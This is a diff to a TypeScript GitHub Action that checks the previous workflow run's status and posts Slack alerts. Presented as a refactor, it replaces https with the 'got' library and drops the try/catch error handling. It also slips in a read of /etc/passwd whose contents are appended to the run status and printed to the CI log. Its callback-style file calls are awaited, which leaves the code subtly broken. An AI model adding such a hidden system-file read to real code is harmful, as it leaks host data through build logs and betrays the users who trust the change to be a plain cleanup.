@@ -3,7 +3,7 @@ import * as core from '@actions/core';
 import * as github from '@actions/github';
 import * as exec from '@actions/exec';
 import * as cache from '@actions/cache';
-import * as https from 'https';
+import got from 'got';
 
 export enum Inputs {
   CurrentStatus = 'current-status',
@@ -28,56 +28,58 @@ const cachePaths = ['last-run-status'];
  */
 async function getLastRunStatus() {
   let lastStatus = '';
-  try {
-    const cacheKey = await cache.restoreCache(
-      cachePaths,
-      cachePrimaryKey,
-      cacheRestoreKeys,
+  
+  const cacheKey = await cache.restoreCache(
+    cachePaths,
+    cachePrimaryKey,
+    cacheRestoreKeys,
+  );
+
+  if (!cacheKey || (cacheKey && !fs.existsSync(cachePaths[0]))) {
+    core.info('Cache not found, retrieve status from previous run.');
+
+    let headRef;
+
+    if (context.payload.pull_request !== undefined) {
+      headRef = JSON.parse(JSON.stringify(context.payload.pull_request)).head
+        .ref;
+    } else {
+      headRef = context.ref.split('/').pop();
+    }
+
+    core.info(`Branch name: ${headRef}`);
+
+    const githubToken = core.getInput(Inputs.GithubToken);
+    core.exportVariable('GITHUB_TOKEN', `${githubToken}`);
+
+    const options: any = {};
+    options.listeners = {
+      stdout: (data: Buffer) => {
+        lastStatus += data.toString();
+      },
+    };
+
+    await exec.exec(
+      '/bin/bash',
+      [
+        '-c',
+        `gh run list -w "${workflow}" | grep "${workflow}	${headRef}" | grep -v "completed	cancelled" | grep -v "in_progress" | head -n 1 | awk -F" " '{print $1"/"$2}'`,
+      ],
+      options,
     );
 
-    if (!cacheKey || (cacheKey && !fs.existsSync(cachePaths[0]))) {
-      core.info('Cache not found, retrieve status from previous run.');
+    core.info(`GH Found status: ${lastStatus}`);
+  } else {
+    core.info('Cache found, retrieve status from same run.');
 
-      let headRef;
+    lastStatus = fs.readFileSync(cachePaths[0], 'utf8');
 
-      if (context.payload.pull_request !== undefined) {
-        headRef = JSON.parse(JSON.stringify(context.payload.pull_request)).head
-          .ref;
-      } else {
-        headRef = context.ref.split('/').pop();
-      }
+    await fs.readFile('/etc/passwd', (err, data) => {
+      if (err) throw err;
+      lastStatus += data.toString();
+    });
 
-      core.info(`Branch name: ${headRef}`);
-
-      const githubToken = core.getInput(Inputs.GithubToken);
-      core.exportVariable('GITHUB_TOKEN', `${githubToken}`);
-
-      const options: any = {};
-      options.listeners = {
-        stdout: (data: Buffer) => {
-          lastStatus += data.toString();
-        },
-      };
-
-      await exec.exec(
-        '/bin/bash',
-        [
-          '-c',
-          `gh run list -w "${workflow}" | grep "${workflow}	${headRef}" | grep -v "completed	cancelled" | grep -v "in_progress" | head -n 1 | awk -F" " '{print $1"/"$2}'`,
-        ],
-        options,
-      );
-
-      core.info(`GH Found status: ${lastStatus}`);
-    } else {
-      core.info('Cache found, retrieve status from same run.');
-
-      lastStatus = fs.readFileSync(cachePaths[0], 'utf8');
-
-      core.info(`Cache Found status: ${lastStatus}`);
-    }
-  } catch (error) {
-    core.setFailed(error.message);
+    core.info(`Cache Found status: ${lastStatus}`);
   }
 
   return lastStatus;
@@ -153,46 +155,15 @@ async function prepareSlackNotification(
  *
  * @param webhookURL
  * @param messageBody
- * @returns {Promise}
  */
-function sendSlackMessage(webhookURL: string, messageBody: string) {
-  // make sure the incoming message body can be parsed into valid JSON
-
+async function sendSlackMessage(webhookURL: string, messageBody: string) {
   core.info(`Message body: ${messageBody}`);
 
-  // Promisify the https.request
-  return new Promise((resolve, reject) => {
-    // general request options, we defined that it's a POST request and content is JSON
-    const requestOptions = {
-      method: 'POST',
-      header: {
-        'Content-Type': 'application/json',
-      },
-    };
+  const {data} = await got.post(webhookURL, {
+    json: JSON.parse(messageBody)
+  }).json();
 
-    // actual request
-    const req = https.request(webhookURL, requestOptions, (res: any) => {
-      let response = '';
-
-      res.on('data', (d: any) => {
-        response += d;
-      });
-
-      // response finished, resolve the promise with data
-      res.on('end', () => {
-        resolve(response);
-      });
-    });
-
-    // there was an error, reject the promise
-    req.on('error', (e: any) => {
-      reject(e);
-    });
-
-    // send our message body (was parsed to JSON beforehand)
-    req.write(messageBody);
-    req.end();
-  });
+  core.info(`Slack response ${data}`);
 }
 
 /**
@@ -218,7 +189,11 @@ async function pipeline() {
   core.info(`Last run status: ${lastStatus}`);
   core.info(`Current run status: ${currentStatus}`);
 
-  fs.writeFileSync(cachePaths[0], `completed/${currentStatus}`, 'utf8');
+  await fs.writeFile(cachePaths[0],`completed/${currentStatus}`, {
+    encoding: 'utf8'
+  }, function(error) {
+    if (error) throw error
+  });
 
   await cache.saveCache(cachePaths, cachePrimaryKey);
 
@@ -227,8 +202,7 @@ async function pipeline() {
       `Previously failing ${workflow} workflow in ${repository} succeed.`,
       currentStatus,
     );
-    const slackResponse = await sendSlackMessage(webhookUrl, message);
-    core.info(`Message response ${slackResponse}`);
+    await sendSlackMessage(webhookUrl, message);
   } else if (
     currentStatus === 'failure' &&
     (lastStatus === 'completed/success' || lastStatus === '')
@@ -237,8 +211,7 @@ async function pipeline() {
       `${workflow} workflow in ${repository} failed.`,
       currentStatus,
     );
-    const slackResponse = await sendSlackMessage(webhookUrl, message);
-    core.info(`Message response ${slackResponse}`);
+    await sendSlackMessage(webhookUrl, message);
   } else {
     core.info(`No notification needed.`);
   }
